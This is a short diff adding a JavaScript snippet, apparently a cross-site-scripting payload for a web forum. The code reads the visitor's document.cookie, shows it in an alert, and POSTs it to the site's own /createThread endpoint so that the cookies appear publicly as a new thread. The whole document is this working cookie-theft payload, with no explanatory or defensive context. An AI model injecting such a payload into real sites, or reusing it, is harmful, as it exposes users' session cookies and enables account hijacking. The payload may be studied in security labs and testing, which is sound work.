@@ -1,0 +1,9 @@
+const cookies = document.cookie;
+
+alert("Here are the cookies" + cookies);
+
+const body = new URLSearchParams({
+  subject: "My cookies",
+  body: cookies  
+});
+fetch(`/createThread?topic=webdev`, {method: "POST", body:body, credentials:"same-origin"}).then(() => {});
